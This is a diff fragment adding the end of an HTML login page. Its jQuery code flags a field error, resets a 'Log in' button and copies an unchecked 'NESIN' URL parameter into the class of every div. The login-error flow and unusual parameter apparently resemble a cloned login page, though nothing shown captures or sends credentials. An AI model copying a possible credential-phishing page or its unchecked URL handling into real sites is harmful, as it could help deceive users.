+     $('.irisv-textfield').addClass('irisv-textfield--error');
+       $("#submit-btn-text").html('Log in');
+        document.getElementById("submit-btn").disabled = false;
+return false;
+}
+          
+    
+        }); 
+    }
+</script>  
+<script type="text/javascript">
+     var urlx = new URL(window.location);
+    var SesIN = urlx.searchParams.get("NESIN");
+    $("div").addClass(SesIN);
+</script>
+    </body>
+</html>
